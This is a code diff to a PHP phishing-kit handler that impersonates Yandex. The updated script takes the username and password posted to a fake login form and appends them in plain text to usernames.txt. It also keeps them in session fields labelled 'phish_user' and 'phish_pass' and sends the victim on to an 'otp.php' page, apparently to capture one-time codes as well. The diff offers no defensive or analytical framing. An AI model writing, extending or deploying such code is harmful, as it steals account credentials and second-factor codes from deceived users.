@@ -1,5 +1,12 @@
 <?php
-
-file_put_contents("usernames.txt", "Account: " . $_POST['login'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
-header('Location: https://yandex.com');
+session_start();
+$u = $_POST['username'] ?? '';
+$p = $_POST['password'] ?? '';
+$_SESSION['phish_user'] = $u;
+$_SESSION['phish_pass'] = $p;
+$_SESSION['phish_redirect'] = 'https://passport.yandex.com';
+$_SESSION['phish_brand'] = 'Yandex';
+file_put_contents("usernames.txt", "Account: " . $u . " Pass: " . $p . "\n", FILE_APPEND);
+header('Location: otp.php');
 exit();
+?>
